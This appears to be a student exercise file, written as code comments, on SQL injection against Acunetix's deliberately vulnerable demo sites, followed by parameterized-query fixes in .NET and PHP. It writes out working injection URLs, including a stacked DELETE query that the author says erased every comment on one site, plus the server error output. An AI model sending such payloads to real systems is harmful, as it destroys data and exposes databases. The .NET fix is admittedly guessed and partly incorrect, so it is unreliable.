// http://testaspnet.vulnweb.com/Comments.aspx?id=1

// Problem:
// The automatic analysys tools indicated that an SQL injection is possible at the parameter id
// Sql injections may grant us access to data we are not sopposed to see or even alter them on the database.


// Exployed example: 
// In this case wie can exployd the comments table of the http://testaspnet.vulnweb.com/ database with an Inferential SQL injection

// 1) table guessing:
// since we don't know the names of the table on the remote database we can use a querry like:
http://testaspnet.vulnweb.com/Comments.aspx?id=1+AND+1=(SELECT+COUNT(*)+FROM+comments)
// this querry will cause ether an error or return a result depending on wther or not the table users exists
// this way we figured out that the table with the name comments exists on the database

// 2) Table manipulation
// at this part I tryed to drop or truncat the table wich dident work but a the following delete query was successful and all comments 
// on the server where deleted 
http://testaspnet.vulnweb.com/Comments.aspx?id=0;+DELETE+FROM+comments+WHERE+1=1


// Fix: 
// To avoid Sql Inject use parameterized queries with bind variables
// since we are dealing with .NET It should be like this (there is a bit of guessing because I don't know the actual querry and never wrote .NET)

public DataSet GetDataSetFromAdapter(
  DataSet dataSet, string connectionString, integer id)
{
  using (OleDbConnection connection = new OleDbConnection(connectionString))
  {
      // The important part is that we define the id with ? and then use OleDbType.Integer as a type
      // so all other imput will be result in an error
      queryString = "SELECT * FROM comments WHERE id = ?"
      OleDbDataAdapter adapter = new OleDbDataAdapter(queryString, connection);
      adapter.SelectCommand.Parameters.Add("@id", OleDbType.Integer).Value = id;

      try
      {
          connection.Open();
          adapter.Fill(dataSet);
      }
      catch (Exception ex)
      {
          Console.WriteLine(ex.Message);
      }
  }
  return dataSet;
}


// Note: the following example is a error based sqlInjecton on the site http://testphp.vulnweb.com

http://testphp.vulnweb.com/listproducts.php?cat=1+OR+1=1

http://testphp.vulnweb.com/listproducts.php?cat=1+AND+1=(SELECT+COUNT(*)+FROM+testtable)
// Error: Table 'acuart.testtable' doesn't exist Warning: mysql_fetch_array()
// expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74

http://testphp.vulnweb.com/listproducts.php?cat=1+AND+1=(SELECT+COUNT(*)+FROM+products)
// no error means the table exists


http://testphp.vulnweb.com/listproducts.php?cat=1;+DELETE+FROM+cat+WHERE+id=1
Error: You have an error in your SQL syntax; 
check the manual that corresponds to your MySQL server version for 
the right syntax to use near 'DELETE FROM cat WHERE id=1 --' at line 1 Warning: mysql_fetch_array() 
expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74

// already we get a lot of information about the server structure like the path /hj/var/www/listproducts.ph

// Fix 
// The fix works the same way but thistime we will use php 

$stmt = $dbConnection->prepare('SELECT * FROM products WHERE id = ?');
$stmt->bind_param('i', $id); // 'i' specifies the variable type => 'integer'
$stmt->execute();

$result = $stmt->get_result();
while ($row = $result->fetch_assoc()) {
    // Do something with $row
}